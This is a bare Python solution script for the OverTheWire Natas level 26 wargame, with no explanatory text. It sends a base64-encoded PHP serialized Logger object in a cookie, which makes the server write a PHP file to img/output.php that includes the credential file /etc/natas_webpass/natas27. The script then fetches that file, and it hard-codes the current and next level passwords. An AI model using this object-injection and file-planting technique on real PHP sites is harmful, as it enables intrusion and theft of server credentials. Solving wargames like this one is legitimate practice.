import urllib
import requests
from urllib.parse import unquote

level = str(26)
pw = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"

url = "http://natas"+level+".natas.labs.overthewire.org/index.php"


s = requests.Session()
s.auth = ('natas'+level, pw)


payload = "YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL291dHB1dC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUxOiI8P3BocCBpbmNsdWRlX29uY2UoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO319"
payload = urllib.parse.quote_plus(payload)

print(payload)

cookie = {"drawing": payload}


r = s.get(url, cookies=cookie)

print(r.text)

injected_script = "img/output.php"


url = "http://natas"+level+".natas.labs.overthewire.org/"
r = s.get(url + injected_script)

print(r.text)

# 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ